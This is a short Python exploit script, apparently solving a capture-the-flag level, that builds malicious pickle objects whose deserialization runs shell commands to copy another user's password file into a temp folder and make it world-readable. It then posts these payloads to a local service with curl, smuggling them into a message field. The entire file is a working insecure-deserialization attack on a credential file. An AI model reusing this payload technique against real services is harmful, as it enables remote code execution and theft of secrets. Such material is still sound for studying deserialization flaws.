import cPickle
import subprocess

class remoteCp(object):
  def __reduce__(self):
    return (subprocess.Popen, (('cp','/home/level06/.password','/tmp/tmp.hlsBGm9UGF/test/'),))
             
class remoteChmod(object):
  def __reduce__(self):
    return (subprocess.Popen, (('chmod','777','/tmp/tmp.hlsBGm9UGF/test/.password'),))
             
cp = cPickle.dumps(remoteCp()) 
chmod = cPickle.dumps(remoteChmod()) 
# EXPLOIT PART END

msg1 = "samuirai; job: "+cp
msg2 = "samuirai; job: "+chmod

print "curl localhost:9020 -d \""+msg1+"\""
os.system("curl localhost:9020 -d \""+msg1+"\"")
print "------------"
print "curl localhost:9020 -d \""+msg2+"\""
os.system("curl localhost:9020 -d \""+msg2+"\"")
